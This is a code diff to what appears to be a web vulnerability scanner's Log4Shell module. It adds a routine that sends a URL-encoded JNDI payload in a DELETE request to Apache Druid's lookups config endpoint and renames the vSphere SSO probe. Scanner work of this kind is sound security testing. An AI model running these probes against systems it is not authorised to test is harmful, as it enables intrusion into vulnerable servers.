@@ -26,6 +26,7 @@ class ModuleLog4Shell(Attack):
     HEADERS_FILE = "log4shell_headers.txt"
 
     VSPHERE_URL = "websso/SAML2/SSO"
+    DRUID_URL = "druid/coordinator/v1/lookups/config/"
 
     def __init__(self, crawler, persister, attack_options, stop_event):
         Attack.__init__(self, crawler, persister, attack_options, stop_event)
@@ -41,7 +42,7 @@ class ModuleLog4Shell(Attack):
         with open(path_join(self.DATA_DIR, self.HEADERS_FILE), encoding='utf-8') as headers_file:
             return headers_file.read().strip().split("\n")
 
-    async def attack_vsphere_url(self, original_request: Request):
+    async def _attack_vsphere_url(self, original_request: Request):
         header_target = "X-Forwarded-For"
 
         malicious_request = Request(
@@ -78,20 +79,38 @@ class ModuleLog4Shell(Attack):
             return
         await self._verify_url_vulnerability(modified_request, payload_unique_id)
 
+    async def _attack_apache_druid_url(self, request_url: str):
+        payload_unique_id = uuid.uuid4()
+        payload = self._generate_payload(payload_unique_id).replace("{", "%7B").replace("}", "%7D").replace("/", "%2f")
+
+        malicious_request = Request(
+            path=request_url + payload,
+            method="DELETE",
+        )
+
+        try:
+            await self.crawler.async_send(malicious_request, follow_redirects=True)
+        except RequestError:
+            self.network_errors += 1
+            return
+        await self._verify_url_vulnerability(malicious_request, payload_unique_id)
+
     async def _attack_specific_cases(self, request: Request):
         root_url = await self.persister.get_root_url()
 
         if request.url == root_url:
-            vsphere_url = request.url + ("" if request.url.endswith("/") else "/") + self.VSPHERE_URL
+            current_url = request.url + ("" if request.url.endswith("/") else "/")
+
             vsphere_request = Request(
-                path=vsphere_url,
+                path=current_url + self.VSPHERE_URL,
                 method=request.method,
                 referer=request.referer,
                 link_depth=request.link_depth
             )
-            await self.attack_vsphere_url(vsphere_request)
+            await self._attack_vsphere_url(vsphere_request)
             await self._attack_apache_struts(request.url)
-        await self.attack_vsphere_url(request)
+            await self._attack_apache_druid_url(current_url + self.DRUID_URL)
+        await self._attack_vsphere_url(request)
 
     async def attack(self, request: Request):
         await self._attack_specific_cases(request)
